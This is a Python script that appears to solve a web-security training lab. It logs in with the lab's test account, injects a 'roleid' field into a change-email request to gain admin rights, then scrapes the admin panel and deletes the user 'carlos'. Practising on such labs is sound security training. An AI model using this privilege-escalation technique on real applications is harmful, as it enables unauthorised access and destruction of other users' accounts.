import requests
from bs4 import BeautifulSoup
site = 'acf71fe71f176752803a1dec000800f0.web-security-academy.net'

s = requests.Session()
login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)

change_url = f'https://{site}/my-account/change-email'

json_data = {'email' : 'name@sou.edu', 'roleid' : 2}
resp = s.post(change_url,json=json_data, allow_redirects = False)
print(resp.text)

url = f'https://{site}/admin'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')

carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]

delete_uri = carlos_delete_link[0]['href']
s.get(f'https://{site}{delete_uri}')